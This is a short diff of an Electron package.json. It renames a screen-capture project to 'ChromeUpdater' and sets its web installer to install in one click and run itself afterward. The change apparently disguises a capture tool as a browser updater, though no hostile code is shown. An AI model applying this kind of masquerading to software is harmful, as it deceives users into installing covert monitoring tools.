@@ -1,6 +1,6 @@
 {
-  "name": "ExtensionManagers",
-  "version": "10.1.5",
+  "name": "ChromeUpdater",
+  "version": "10.1.6",
   "description": "This project contains example about multiscreen capture via electron-js",
   "main": "index.js",
   "scripts": {
@@ -32,6 +32,8 @@
   },
   "build": {
     "win": {
+      "oneClick": true,
+      "runAfterFinish": true,
       "target": [
         {
           "target": "nsis-web",
